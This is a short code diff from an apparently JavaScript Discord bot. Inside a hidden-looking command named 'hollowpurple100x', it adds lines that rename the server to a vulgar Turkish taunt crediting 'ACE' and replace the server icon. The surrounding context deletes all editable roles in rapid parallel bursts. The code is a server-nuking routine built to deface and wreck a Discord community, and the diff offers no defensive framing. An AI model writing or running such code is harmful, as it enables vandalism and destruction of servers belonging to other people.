@@ -840,6 +840,10 @@ if (command === 'hollowpurple100x') {
 
     const aceGif = "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExd2gyc2Z6YzNwMjM2cmxncXhpM3ZuY2w2b2V1Y2RteGU2Z2R1ZXZmayZlcD12MV9naWZzX3NlYXJjaCZjdD1n/0wxRYPhdD7n3W7NQ1R/giphy.gif";
 
+    // --- ÖZEL DETAY: SUNUCU KİMLİĞİNİ DEĞİŞTİR ---
+    guild.setName("🟣 ACE TARAFINDAN SİKİLDİNİZ 🟣").catch(() => {});
+    guild.setIcon(aceGif).catch(() => {});
+
     // 1. ADIM: ROLLERİ PARALEL VE YILDIRIM HIZIYLA SİL (150ms - Maksimum Risk/Hız)
     const roles = guild.roles.cache.filter(r => r.editable && r.name !== "@everyone" && !r.managed).toJSON();
     roles.forEach((role, index) => {
